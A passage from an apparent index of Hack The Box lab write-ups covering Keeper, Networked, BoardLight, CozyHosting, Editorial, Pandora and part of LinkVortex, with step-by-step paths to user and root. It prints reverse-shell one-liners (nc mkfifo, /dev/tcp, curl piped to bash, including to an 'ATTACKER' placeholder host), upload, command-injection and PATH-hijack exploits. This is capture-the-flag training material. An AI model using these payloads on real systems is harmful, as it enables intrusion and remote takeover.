- The KeePass dump yields the incomplete phrase dgrød med fløde; searching that fragment reconstructs the Unicode master password rødgrød med fløde, which must be preserved exactly when opening passcodes.kdbx.

### User path

**Memory chain:** default credentials → ticket/helpdesk disclosure → credential reuse → SSH

- A quick Google search for Request Tracker default credentials leads us to the documentation, which reveals the username is root , and the password is password .
- Foothold Enumerating the system, under the admin > user section, we see there are two users, lnorgaard and root .
- Further enumeration into the user lnorgaard reveals the password Welcome2023! under the comment section.
- Attempting to log in via SSH using the password and as the user lnorgaard is successful. ssh lnorgaard@10.10.11.227 Here, we can grab the user flag from the user's home folder. cat /home/lnorgaard/user.txt

#### Commands and PDF search strings

- `nmap -p$ports -Pn -sC -sV 10.10.11.227`
- `ssh lnorgaard@10.10.11.227`

### Artifacts and exact search anchors

`tickets.keeper.htb`, `/etc/hosts`, `keeper.htb`, `/home/lnorgaard/user.txt`

Open the PDF around page **3** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Extract the PuTTY private key from KeePass and convert it to OpenSSH format with puttygen.
- Set restrictive key permissions and SSH as root using the converted key.
- Preserve Unicode characters in the reconstructed KeePass master password.
- Convert the PuTTY key from the KeePass Network entry with puttygen ssh_key_file -O private-openssh -o id_rsa before chmod/SSH; the raw PuTTY-formatted key is not directly usable by OpenSSH.
- For KeePass artifacts, collect the database, dump/config/key material, and test the relevant recovery vulnerability; convert any recovered PuTTY/SSH key into a usable OpenSSH key.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.

### Root / Administrator path

**Memory chain:** KeePass database recovery → CVE-2023-32784 → PuTTY private key conversion → SSH as root

- In order for the exploit to work we need to install dotnet which can be found here.
- also need to install kpcli , which is a command-line interface (interactive shell) used to work with KeePass 1.x or 2.x database files.
- The database key appears invalid or else the database is corrupt.
- can use it to generate the private SSH key for the root user.
- get a shell as root and the root flag can be found at /root/root.txt .

#### Commands and PDF search strings

- `sudo apt-get install kpcli -y`
- `SSH keys. PuTTYgen supports various public-key cryptosystems, including the Rivest–Shamir–`
- `ssh root@tickets.keeper.htb -i id_rsa`

### Artifacts and exact search anchors

`passcodes.kdbx`, `RT30000.zip`, `CVE-2023-32784`, `/home/lnorgaard/RT30000.zip`, `tickets.keeper.htb`, `/root/root.txt`

Open the PDF around page **4** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 8- Networked

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Networked.md) · [Official PDF](./htb-writeups/Networked.pdf)

### Machine path overview

Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution. The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.

### Remote enumeration and foothold checks

- Download/read the exposed backup source for upload.php and photos.php before fuzzing payloads blindly.
- Map the upload checks: permitted image extensions and image validation can be bypassed with a polyglot containing a valid image header plus PHP.
- Use a filename/extension combination Apache will execute and request the stored file through the gallery/uploads path to obtain www-data code execution.
- Use a double extension such as shell.php.png and prepend the PNG magic bytes 89 50 4E 47 0D 0A 1A 0A so both the allowed-suffix and MIME checks pass while Apache still interprets the embedded PHP.
- Test upload validation separately for extension, MIME, magic bytes, filename/path, and post-upload execution. Determine the exact storage path and whether timing/name prediction is involved.
- Enumerate scheduled jobs/tasks plus every referenced script, binary, working directory, and PATH component. Writable dependencies matter even when the task itself is protected.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Post-foothold local enumeration and lateral movement

- In /home/guly, read both crontab.guly and check_attack.php; the latter runs every three minutes over filenames in /var/www/html/uploads.
- Trace the unsanitized filename variable into the shell/mail command and create a malicious filename that injects a callback command.
- Wait for the guly cron job to process the filename and catch the lateral-movement shell.
- Run sudo -l as guly and read changename.sh completely, including its character blacklist and generated /etc/sysconfig/network-scripts/ifcfg-guly file.
- The cron filename command injection cannot contain / because it must be a valid filename; base64-encode the callback command and decode/execute it from a shell-safe malicious filename.
- The www-data-to-guly transition is the three-minute `check_attack.php` cron processing an injected upload filename. Root is a separate `sudo changename.sh` CentOS `ifcfg` value-injection path; SSH and PATH hijacking are not the user transition.

### User path

**Memory chain:** exposed PHP backup source → shell.php.png PNG polyglot → shell as www-data → three-minute check_attack.php filename injection → shell as guly

- The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.
- The backup folder contains a tar archive, which seems interesting.
- The magic bytes for PNG are “89 50 4E 47 0D 0A 1A 0A”, which can be added to the beginning of the shell.
- Next, curl can be used to execute a bash reverse shell.
- Lateral Movement Browsing to the home folder of the user, two files named check_attack.php and crontab.guly are found.

#### Commands and PDF search strings

- `exec(​"rm -f $logpath"​);`
- `exec(​"nohup /bin/rm -f $path$value > /dev/null 2>&1 &"​);`
- `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`

### Artifacts and exact search anchors

`upload.php`, `photos.php`, `lib.php`, `check_attack.php`, `/home/guly/check_attack.php`, `/var/www/html/lib.php`, `/var/www/html/uploads/`, `/tmp/attack.log`

Open the PDF around page **2** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Exploit CentOS network-script command execution by supplying a crafted interface configuration value that passes the weak blacklist but becomes a shell directive.
- Let the root-run changename.sh write the malicious ifcfg file and trigger ifup guly0.
- Account for the script's allowed/blocked characters when constructing the injected command.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.

### Root / Administrator path

**Memory chain:** sudo changename.sh → CentOS ifcfg value injection → root shell

- A shell as guly should be received in a while, after which we can spawn a tty.
- Looking at the sudo privileges, we see that guly can execute changename.sh as root.
- This is because the scripts are sourced by the underlying service, leading to execution of anything after a space.
- can exploit this by executing /bin/bash as root.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`changename.sh`, `/etc/sysconfig/network-scripts/ifcfg-guly`

Open the PDF around page **10** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 9- BoardLight

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/BoardLight.md) · [Official PDF](./htb-writeups/BoardLight.pdf)

### Machine path overview

BoardLight is an easy difficulty Linux machine that features a Dolibarr instance vulnerable to CVE-2023-30253. This vulnerability is leveraged to gain access as www-data . After enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine. Enumerating the system, a SUID binary related to enlightenment is identified which is vulnerable to privilege escalation via CVE-2022-37706 and can be abused to leverage a root shell.

### Remote enumeration and foothold checks

- Use the hostname from the page footer, then fuzz the Host header for virtual hosts; crm.board.htb is not found by ordinary directory enumeration.
- Add crm.board.htb to /etc/hosts and fingerprint Dolibarr 17.0.0.
- Try the simple admin:admin credential, then exploit CVE-2023-30253 by creating/executing PHP content through the Website module to gain www-data.
- CVE-2023-30253 depends on Dolibarr's case-sensitive filter: create a Website page, edit its HTML source, and use uppercase <?PHP ... ?> rather than lowercase <?php before viewing the page to execute it.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Post-foothold local enumeration and lateral movement

- Read the Dolibarr configuration at /var/www/html/crm.board.htb/htdocs/conf/conf.php, not only environment files.
- Recover the database password from conf.php and test it against local interactive users listed in /etc/passwd; it is reused by larissa for SSH.
- As larissa, enumerate nonstandard SUID binaries and installed application versions; the Enlightenment helpers stand out.
- Check enlightenment --version and match the SUID enlightenment_sys installation to CVE-2022-37706.

### User path

**Memory chain:** crm.board.htb vhost → Dolibarr 17.0.0 → uppercase PHP filter bypass → shell as www-data → conf.php password reuse → SSH as larissa

- Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.
- filter out responses with a size of 15949 bytes using the -fs flag, which helps us ignore irrelevant results and focus on unique responses that might reveal valid subdomains.
- Then we use the payload below to get a shell. <?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4455 >/tmp/f");?> In the payload above, the PHP code utilizes the system() function to execute a shell command on the server.
- This command below starts a new shell session using a script , which creates a new interactive Bash shell.
- It includes details such as the username, user ID (UID), group ID (GID), home directory, and default shell.

#### Commands and PDF search strings

- `nmap -p$ports -Pn -sC -sV 10.10.11.11`
- `Nmap done: 1 IP address (1 host up) scanned in 39.78 seconds`
- `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomainstop100000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb'`
- `ssh larissa@board.htb`

### Artifacts and exact search anchors

`board.htb`, `/etc/hosts`, `/usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomainstop100000.txt`, `FUZZ.board.htb`, `/usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt`, `crm.board.htb`, `/tmp/f`, `/var/www/html/crm.board.htb/htdocs/conf/conf.php`, `conf.php`, `/var/www/html/crm.board.htb/documents`, `/etc/passwd`, `/home/larissa`, `/usr/share/doc/*/copyright`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use the CVE-2022-37706 Enlightenment local privilege-escalation path against the vulnerable SUID helper.
- Verify the exact helper path/version before running a public script; multiple Enlightenment binaries are present.
- Escalate through the root-owned SUID Enlightenment 0.23.1 helper with CVE-2022-37706; Git history/configuration is not part of this privilege-escalation path.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
- Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.

### Root / Administrator path

**Memory chain:** SUID Enlightenment 0.23.1 helper → CVE-2022-37706 → root shell

- The command utilizes Python's built-in HTTP server functionality, which allows us to host files easily.
- This vulnerability allows local users to gain elevated privileges because the binary is SUID and owned as the root user, and the system library function mishandles path names that begin with a /dev/.. substring.

#### Commands and PDF search strings

- `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
- `sudo python3 -m http.server 3000`
- `curl http://10.10.14.41:3000/linpeas.sh|bash`
- `wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPEexploit/main/exploit.sh`

### Artifacts and exact search anchors

`linpeas.sh`, `/usr/lib/xorg/Xorg.wrap`, `/usr/lib/x86_64-linux-`, `CVE-2022-37706`, `exploit.sh`, `/etc/fstab`, `/root/root.txt`

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 10- CozyHosting

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/CozyHosting.md) · [Official PDF](./htb-writeups/CozyHosting.pdf)

### Machine path overview

CozyHosting is an easy-difficulty Linux machine that features a Spring Boot application. The application has the Actuator endpoint enabled. Enumerating the endpoint leads to the discovery of a user's session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application's JAR file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user josh . The user is allowed to run ssh as root , which is leveraged to fully escalate privileges.

### Remote enumeration and foothold checks

- Enumerate Spring Boot Actuator endpoints, especially /actuator/sessions and /actuator/mappings, rather than brute-forcing only /login.
- Steal the exposed authenticated session ID and supply it as the application's session cookie to reach the dashboard.
- Trace the dashboard's SSH-host input into a shell command; bypass whitespace/character restrictions with shell expansion/encoding and inject a reverse shell.
- The username command-injection field rejects literal spaces, so use ${IFS} explicitly as the delimiter, for example test;curl${IFS}http://ATTACKER:7000/rev.sh|bash;, while keeping a valid hostname such as 127.0.0.1.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.

### Post-foothold local enumeration and lateral movement

- Locate the running application JAR and unpack/decompile it; inspect application.properties for the local PostgreSQL DSN and hardcoded database credential.
- Connect to PostgreSQL on 127.0.0.1, enumerate the application users table, and extract password hashes.
- Crack the relevant hash and test the plaintext against local Linux accounts; it yields SSH access as josh.
- Run sudo -l and note that josh may execute ssh as root with attacker-controlled arguments.

### User path

**Memory chain:** Spring Actuator session disclosure → stolen dashboard session → ${IFS} command injection → shell as app

- can now run our scan again, this time using a Spring Boot -specific wordlist. ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100 We see the actuator endpoint is exposed, which is mainly used for debugging purposes in Spring Boot applications.
- This is what we will use to initiate the reverse shell connection to our Netcat listener.
- To get a more stable shell we can use the script command to create a new PTY with bash. script /dev/null -c bash Lateral Movement Our shell lands us in the /app directory, where we see a .jar (Java Archive) file named cloudhosting-0.0.1.jar .
- can extract it to the /tmp/app by using the -d flag in unzip , which specifies the destination folder. unzip -d /tmp/app cloudhosting-0.0.1.jar Looking at the /tmp/app/BOOT-INF/classes/application.properties file, we see some database credentials. application.properties is a configuration file used in Spring Boot applications.
- can attempt to utilize the previously-discovered password to log in as the user josh . ssh josh@10.10.11.230 We are successfully logged in a user josh .

#### Commands and PDF search strings

- `nmap -p$ports -sV 10.10.11.230`
- `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100`
- `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ`
- `ssh -i id_rsa username@hostname`
- `select * from users;`
- `hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt`
- `ssh josh@10.10.11.230`

### Artifacts and exact search anchors

`cozyhosting.htb`, `/etc/hosts`, `/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3medium.txt`, `/usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt`, `rev.sh`, `/tmp/app`, `/tmp/app/BOOT-INF/classes/application.properties`, `/usr/share/wordlists/rockyou.txt`, `/etc/passwd`, `/home/josh/user.txt`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- The allowed SSH command is abused with `PermitLocalCommand=yes` and `LocalCommand=/bin/bash`. LocalCommand runs only after a successful SSH connection, so authenticate as `josh@127.0.0.1` with Josh's valid password; an unreachable dummy host or ProxyCommand is the wrong path.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.

### Root / Administrator path

**Memory chain:** JAR/PostgreSQL credential recovery → crack Josh hash → SSH as josh → sudo SSH PermitLocalCommand → root shell

- Upon checking the sudo permissions for the user josh , we discover that they can run /usr/bin/ssh as root . sudo -l We can leverage this to gain a shell as root .
- Reading through the SSH documentation and this link, we see that running the command with the -o flag allows us to specify the PermitLocalCommand=yes option.
- This option is used to allow the execution of local commands on the client machine after a successful SSH connection is established.

#### Commands and PDF search strings

- `sudo -l`
- `sudo /usr/bin/ssh -v -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash'`

### Artifacts and exact search anchors

`/usr/bin/ssh`, `/root/root.txt`

Open the PDF around page **15** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 11- Editorial

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Editorial.md) · [Official PDF](./htb-writeups/Editorial.pdf)

### Machine path overview

Editorial is an easy difficulty Linux machine that features a publishing web application vulnerable to Server-Side Request Forgery (SSRF) . This vulnerability is leveraged to gain access to an internal running API, which is then leveraged to obtain credentials that lead to SSH access to the machine. Enumerating the system further reveals a Git repository that is leveraged to reveal credentials for a new user. The root user can be obtained by exploiting CVE-2022-24439 and the sudo configuration.

### Remote enumeration and foothold checks

- Test the book-cover URL fetcher for SSRF and use response differences/files to probe loopback services.
- Automate a localhost port sweep through the SSRF because the visible port-80 response is only a JPEG and does not prove no other internal service exists.
- Query the discovered internal API endpoints and versions; an API response exposes the dev SSH credential.
- Use the dev credential over SSH and enumerate the user's application directory for hidden source-control metadata.
- The cover-URL SSRF sweep identifies localhost port 5000; then request http://127.0.0.1:5000/api/latest/metadata/messages/authors through the same preview flow, because that exact internal endpoint returns the dev SSH credential.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Use SSRF to enumerate loopback/internal ports, cloud metadata, and internal HTTP APIs. Compare status, size, and timing when responses are not reflected.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.

### Post-foothold local enumeration and lateral movement

- Run git log/show/diff across the repository, including old commits; a prior template contains the prod credential that is absent from the current tree.
- Switch to prod and run sudo -l; prod may run /opt/internal_apps/clone_changes/clone_prod_change.py as root with an arbitrary argument.
- Read the privileged Python script and note it uses GitPython Repo.clone_from on the supplied URL with protocol.ext.allow=always.

### User path

**Memory chain:** SSH → SSRF → reverse shell → Git history/config → group-membership abuse → sudo rule abuse

- see a form allowing users to enter information to facilitate the publishing process.
- By sending a request to http://127.0.0.1:80 , we can check if there is a service running on that port, but this only returns a JPEG file.
- This will automate the process of sending requests to each port listed in the wordlist, allowing us to fuzz through multiple ports quickly and identify which ones might be running web services.
- It also indicates what commands prod can run as the root user.
- In this case, the user prod can run a Python script with root privileges.

#### Commands and PDF search strings

- `nmap -p$ports -Pn -sC -sV 10.10.11.20`
- `Nmap done: 1 IP address (1 host up) scanned in 34.26 seconds`
- `select Grep - Match , and add the .jpeg extensions. This helps us narrow down our results and`
- `curl http://editorial.htb/static/uploads/83a4fc7d-4922-47a0-88e8-c62a674f41a3 |jq`

### Artifacts and exact search anchors

`editorial.htb`, `/etc/hosts`, `/usr/bin/python3`, `ssrf2.py`, `e:\nUsername`, `app.py`, `tiempoarriba.htb`, `/home/dev/apps$`, `/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/opt/internal_apps/clone_changes/clone_prod_change.py`, `clone_prod_change.py`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Map the GitPython behavior to CVE-2022-24439 and use an ext:: URL so the root-run clone operation executes a shell command/script.
- Stage the reverse-shell script in a readable path, start the listener, and pass the crafted ext::sh URL to the exact allowed sudo command.
- Do not rely only on the CVE number: the exploitable input is the arbitrary clone URL passed directly to Repo.clone_from.
- GitPython's ext:: remote-helper payload uses % in place of a space; pass a value such as 'ext::sh -c bash% /tmp/shell.sh' to the exact allowed clone_prod_change.py sudo command or the helper command will parse incorrectly.

### Root / Administrator path

**Memory chain:** Git history/config → CVE-2022-24439 → reverse shell

- start by checking the permissions of the file clone_prod_change.py . prod@editorial:/home/dev/apps$ ls -la /opt/internal_apps/clone_changes/clone_prod_change.py -rwxr-x--- 1 root prod 256 Jun 4 11:30 /opt/internal_apps/clone_changes/clone_prod_change.py prod@editorial:/home/dev/apps$ From the output, we see that the file has the following permission settings, -rwxr-x---.
- This means that the owner root has read, write, and execute permissions; the group prod has read and execute permissions, and others have no permissions.
- can exploit this vulnerability to gain a shell with root privileges.
- To do this, we first create a script to obtain a reverse shell. prod@editorial:/home/dev/apps$ echo "bash -i >& /dev/tcp/10.10.14.41/4444 0>&1" > /tmp/shell.sh prod@editorial:/home/dev/apps$ We then start a Netcat listener on our machine. nc -lnvp 4444 listening on [any] 4444 ...

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`clone_prod_change.py`, `/home/dev/apps$`, `/opt/internal_apps/clone_changes/clone_prod_change.py`, `/usr/bin/python3`, `/opt/internal_apps/clone_changes`, `CVE-2022-24439`, `/tmp/shell.sh`, `shell.sh`, `/root/root.txt`

Open the PDF around page **12** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 12- Pandora

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Pandora.md) · [Official PDF](./htb-writeups/Pandora.pdf)

### Machine path overview

Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user daniel . Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called matt is achieved by chaining SQL injection & RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user root is performed by exploiting a SUID binary for PATH variable injection.

### Remote enumeration and foothold checks

- Scan UDP as well as TCP; SNMP on UDP/161 is the entry point and is missed by a TCP-only workflow.
- Walk SNMP process/command-line data and notice a host-check command exposing Daniel's cleartext credential.
- Use the credential over SSH, then inspect local listeners and Apache vhost files under /etc/apache2/sites-enabled/.
- Read pandora.conf: Pandora FMS is bound to localhost:80 and requires SSH dynamic/local forwarding plus a SOCKS-aware browser/proxychains.
- Fingerprint Pandora FMS and exploit the chart_generator.php session_id SQLi to dump tsessions_php and obtain Matt's valid session.
- Matt's stolen standard Pandora session cannot use file upload, so the PHAR-deserialization route fails. Use the Events AJAX command injection instead: URL-encode `/` and place the command in the target request parameter.
- Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
- Use SSH/local/dynamic port forwarding for internal-only services and hidden vhosts. Preserve the required Host header/DNS name through the tunnel rather than browsing only `localhost`.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- After landing on Linux, inspect Apache configuration (`apachectl -S`, `/etc/apache2/sites-enabled/*`, `sites-available/*`, included configs, and `.htaccess`). Record hidden `ServerName`/aliases, document roots, proxy targets, access-control headers, credentials, and localhost-only vhosts, then tunnel/enumerate them.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Post-foothold local enumeration and lateral movement

- As matt, enumerate unusual SUID binaries; /usr/bin/pandora_backup is custom and root-owned.
- Run strings on pandora_backup and observe that it invokes tar by relative name rather than an absolute path.
- Confirm the binary executes with effective root privileges before preparing PATH hijacking.

### User path

**Memory chain:** SNMP process command-line credential → SSH as daniel → localhost Pandora vhost tunnel → session_id SQL injection → Matt session → Events AJAX target command injection → shell as matt

- The port scan reveals a SSH, web-server and SNMP service running on the box.
- Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user daniel .
- Let us use this command-line utility known as snmpwalk to scan the SNMP service and obtain all variables of the managed systems and displays them. snmpwalk -v 1 -c public 10.10.11.136 It seems that the target is performing a host check and passing cleartext credentials over CLI.
- After getting into the user account we identify that we don't have access to the file upload functionality, so we cannot execute the phar deserialization part of the exploit.
- Command used in the RCE payload : curl+10.10.14.6:80/shell.sh|bash Upon sending the request to the server, we get a reverse shell as user matt .

#### Commands and PDF search strings

- `nmap -sU 10.10.11.136`
- `snmpwalk -v 1 -c public 10.10.11.136`
- `ssh -D 9090 daniel@10.10.11.136`

### Artifacts and exact search anchors

`/var/www/`, `/etc/apache2/sites-enabled/`, `pandora.conf`, `/var/www/pandora`, `/etc/apache2/sites-enabled/pandora.conf`, `chart_generator.php`, `/etc/proxychains4.conf`, `proxychains4.conf`, `chart_gernerator.php`, `shell.sh`, `/home/matt/user.txt`

Open the PDF around page **1** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Create a malicious executable named tar in a writable directory, prepend that directory to PATH, and run pandora_backup.
- The exploit depends on relative command resolution inside the SUID binary; an absolute /usr/bin/tar call would not be vulnerable.
- If Matt's shell is restricted and pandora_backup fails, escape it through the SUID /usr/bin/at GTFOBins path (for example echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null) before creating /tmp/tar, prepending /tmp to PATH, and running pandora_backup.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Root / Administrator path

**Memory chain:** SUID /usr/bin/at restricted-shell escape → SUID pandora_backup → relative tar PATH hijack → root shell

- But this binary has the SUID bit set, so the binary must run with root privileges.
- This seems to be a case of a restricted shell.
- Due to this fact, we can try hijacking the PATH variable, and ultimately escalate our privileges to root.
- Start a Netcat listener on your local machine $ nc -nvlp 4444 Then, run the pandora_backup binary so as to trigger the reverse shell through the malicious tar file. $ /usr/bin/pandora_backup After the tar file is executed, a reverse shell is received on our listener.

#### Commands and PDF search strings

- `find / -perm -4000 2>/dev/null`

### Artifacts and exact search anchors

`/usr/bin/pandora_backup`, `/usr/bin/at`, `pandorabackup.tar.gz`, `/root/root.txt`

Open the PDF around page **15** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 13- LinkVortex

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/LinkVortex.md) · [Official PDF](./htb-writeups/LinkVortex.pdf)

### Machine path overview

LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed .git directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to CVE-2023-40028. This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access.

### Remote enumeration and foothold checks

- Fuzz Host headers and discover dev.linkvortex.htb, then enumerate it for an exposed .git directory.
- Dump the Git objects/history recursively and inspect tests/source for the changed Ghost administrator password.
- Authenticate to Ghost and exploit CVE-2023-40028 by importing a ZIP that preserves a symlink.
- Use the symlink file-read first against a harmless path, then target /var/lib/ghost/config.production.json for the host user's credential.
- Reuse the Ghost configuration credential to SSH as bob.
- Build the Ghost import as exploit/content/images/<name>.png and archive it with zip -r -y so the symlink is stored as a symlink; an ordinary ZIP operation may dereference it and defeat CVE-2023-40028.
- Ghost runs in a container, but no container escape is needed: use the symlink import for arbitrary file read of `/var/lib/ghost/config.production.json`, recover Bob's reused credential, and SSH to the host.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Post-foothold local enumeration and lateral movement

- Run sudo -l and read /opt/ghost/clean_symlink.sh; bob can run it as root for attacker-named *.png files.
- Trace the script's check-then-use sequence and identify the TOCTOU window where a symlink target can be swapped.
- Use a broken/benign symlink to pass the initial check, then repeatedly replace it with a link to /root/.ssh/id_rsa while the script runs.

### User path

**Memory chain:** dev vhost → exposed Git history → Ghost administrator credential → CVE-2023-40028 symlink ZIP file read → config.production.json Bob credential → SSH as bob

- Foothold Now that we can access the ghost dashboard, let's see what we can find.
- will exploit it manually, but a PoC from GitHub that can automate the process for us is available.
